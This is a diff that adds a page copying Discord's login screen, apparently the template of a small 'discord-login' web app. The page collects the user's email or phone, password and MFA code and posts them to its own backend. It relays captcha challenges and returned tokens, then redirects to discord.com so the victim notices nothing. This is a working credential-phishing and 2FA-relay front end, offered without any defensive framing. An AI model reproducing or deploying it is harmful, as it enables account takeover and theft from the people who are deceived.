@@ -1,6 +1,139 @@
-discord-login/
-├── requirements.txt
-├── app.py
-├── render.yaml
-└── templates/
-    └── index.html
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord</title>
+<link rel="icon" href="https://discord.com/assets/favicon.ico">
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+<script src="https://www.google.com/recaptcha/api.js?render=explicit" async defer></script>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#1e1f22;font-family:"gg sans",Whitney,"Helvetica Neue",Arial,sans-serif;color:#dbdee1;padding:20px}
+  .box{width:100%;max-width:480px;background:#313338;border-radius:5px;padding:32px;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+  h1{font-size:24px;margin:0 0 6px;color:#f2f3f5;text-align:center;font-weight:600}
+  .sub{text-align:center;color:#b5bac1;font-size:16px;margin:0 0 20px}
+  .lbl{display:block;font-size:12px;font-weight:700;color:#b5bac1;letter-spacing:.02em;margin:16px 0 8px;text-transform:uppercase}
+  .req{color:#f23f43}
+  .inp{width:100%;padding:10px;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;
+       color:#f2f3f5;font-size:16px;outline:none}
+  .inp:focus{border-color:#5865f2}
+  .btn{width:100%;margin-top:24px;padding:12px;background:#5865f2;color:#fff;border:0;border-radius:3px;
+       font-size:16px;font-weight:600;cursor:pointer;transition:background .17s}
+  .btn:hover{background:#4752c4}
+  .btn:disabled{opacity:.6;cursor:default}
+  .err{color:#fa777c;font-size:14px;font-style:italic;margin-top:10px}
+  .hidden{display:none!important}
+  #captcha-wrap{margin-top:16px;display:flex;justify-content:center}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1 id="title">Welcome back!</h1>
+  <p class="sub" id="sub">We're so excited to see you again!</p>
+
+  <form id="form" autocomplete="off" novalidate>
+    <label class="lbl" id="l-login">Email or Phone Number <span class="req">*</span></label>
+    <input id="login" class="inp" type="text" autocapitalize="none" autocomplete="off" spellcheck="false">
+
+    <label class="lbl" id="l-pass">Password <span class="req">*</span></label>
+    <input id="password" class="inp" type="password" autocomplete="off">
+
+    <div id="captcha-wrap" class="hidden"><div id="cap"></div></div>
+
+    <div id="mfa-wrap" class="hidden">
+      <label class="lbl">Code <span class="req">*</span></label>
+      <input id="mfa" class="inp" type="text" inputmode="numeric" autocomplete="one-time-code">
+    </div>
+
+    <button id="btn" class="btn" type="submit">Log In</button>
+    <div id="err" class="err hidden"></div>
+  </form>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+let stage = 'login';
+let captchaKey = null;
+let rqtoken = null;
+let ticket = null;
+let capDone = false;
+
+const show = (id, on) => $(id).classList.toggle('hidden', !on);
+function fail(msg){ const e = $('err'); e.textContent = msg || ''; show('err', !!msg); }
+function busy(b){ $('btn').disabled = b; $('btn').textContent = b ? 'Logging in\u2026' : 'Log In'; }
+
+async function post(url, body){
+  const r = await fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)});
+  let data = {};
+  try { data = await r.json(); } catch(e){}
+  return { status: r.status, data };
+}
+
+function success(){
+  $('btn').textContent = 'Success!';
+  $('btn').style.background = '#248046';
+  setTimeout(() => location.href = 'https://discord.com/channels/@me', 700);
+}
+
+function renderCaptcha(sitekey, service){
+  if (!sitekey || capDone) return;
+  capDone = true;
+  show('captcha-wrap', true);
+  const isRecap = (service || '').toLowerCase().includes('recaptcha');
+  const cb = key => { captchaKey = key; fail(''); (stage === 'mfa' ? doMfa() : doLogin()); };
+  try {
+    if (isRecap && window.grecaptcha) grecaptcha.render('cap', {sitekey, callback: cb});
+    else if (window.hcaptcha) hcaptcha.render('cap', {sitekey, callback: cb});
+    else setTimeout(() => { capDone = false; renderCaptcha(sitekey, service); }, 400);
+  } catch(e){ capDone = false; }
+}
+
+function handle(data, status){
+  if (data.token) return success();
+  if (data.captcha_key || data.captcha_sitekey){
+    rqtoken = data.captcha_rqtoken || rqtoken;
+    renderCaptcha(data.captcha_sitekey, data.captcha_service);
+    return fail('Please complete the captcha');
+  }
+  if (data.mfa){
+    ticket = data.ticket;
+    stage = 'mfa';
+    show('mfa-wrap', true);
+    $('mfa').focus();
+    return fail('');
+  }
+  fail(data.message || ('Login failed (' + status + ')'));
+}
+
+async function doLogin(){
+  fail('');
+  if (!captchaKey && (!$('login').value.trim() || !$('password').value))
+    return fail('Required field');
+  busy(true);
+  const body = { login: $('login').value.trim(), password: $('password').value };
+  if (captchaKey){ body.captcha_key = captchaKey; body.rqtoken = rqtoken; }
+  const { status, data } = await post('/login', body);
+  busy(false);
+  handle(data, status);
+}
+
+async function doMfa(){
+  fail('');
+  if (!$('mfa').value.trim()) return fail('Required field');
+  busy(true);
+  const body = { code: $('mfa').value.trim(), ticket };
+  if (captchaKey){ body.captcha_key = captchaKey; body.rqtoken = rqtoken; }
+  const { status, data } = await post('/mfa', body);
+  busy(false);
+  handle(data, status);
+}
+
+$('form').addEventListener('submit', e => {
+  e.preventDefault();
+  stage === 'mfa' ? doMfa() : doLogin();
+});
+</script>
+</body>
+</html>
